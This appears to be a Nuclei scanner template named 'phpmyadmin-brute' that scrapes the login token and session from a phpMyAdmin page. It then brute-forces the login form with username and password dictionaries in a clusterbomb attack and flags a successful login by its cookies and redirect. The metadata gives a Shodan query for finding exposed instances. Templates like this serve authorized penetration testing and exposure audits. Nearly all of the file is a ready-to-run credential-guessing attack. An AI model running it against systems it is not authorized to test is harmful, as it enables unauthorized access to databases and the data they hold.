flow: http(1) && http(2)
http:
- matchers:
  - internal: true
    type: word
    words:
    - pma_username
  raw:
  - 'GET /index.php HTTP/1.1

    Host: {{Hostname}}

    '
- attack: clusterbomb
  extractors:
  - group: 1
    internal: true
    name: token
    part: body
    regex:
    - name="token" value="([a-z0-9]+)"
    type: regex
  - group: 1
    internal: true
    name: session
    part: body
    regex:
    - name="set_session" value="([a-z0-9]+)"
    type: regex
  matchers:
  - condition: and
    dsl:
    - contains(header_2, "phpMyAdmin=") && contains(header_2, "pmaUser-1=")
    - status_code_2 == 302
    - contains(header_2, 'index.php?collation_connection=utf8mb4_unicode_ci') || contains(header_2,
      '/index.php?route=/&route=%2F')
    type: dsl
  matchers-condition: and
  payloads:
    password: github/dictionary/phpmyadmin_pass.txt
    user: github/dictionary/phpmyadmin_login.txt
  raw:
  - 'GET /index.php HTTP/1.1

    Host: {{Hostname}}

    '
  - 'POST /index.php HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/x-www-form-urlencoded

    Cookie: phpMyAdmin={{trim(session,"[]")}}; pma_lang=en


    set_session={{trim(session,"[]")}}&pma_username={{user}}&pma_password={{url_encode(password)}}&server=1&route=%2F&token={{trim(token,"[]")}}&lang=en

    '
  req-condition: true
id: phpmyadmin-brute
info:
  author: Natto97, gtrrnr
  classification:
    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:L/A:L
    cvss-score: 8.3
    cwe-id: CWE-522
  description: phpMyAdmin contains a default login vulnerability. An attacker can
    obtain access to user accounts and access sensitive information, modify data,
    and/or execute unauthorized operations.
  metadata:
    max-request: 2945
    shodan-query: http.title:phpMyAdmin
    verified: true
  name: phpmyadmin-brute
  reference:
  - https://www.phpmyadmin.net
  severity: high
  tags: default-login,phpmyadmin
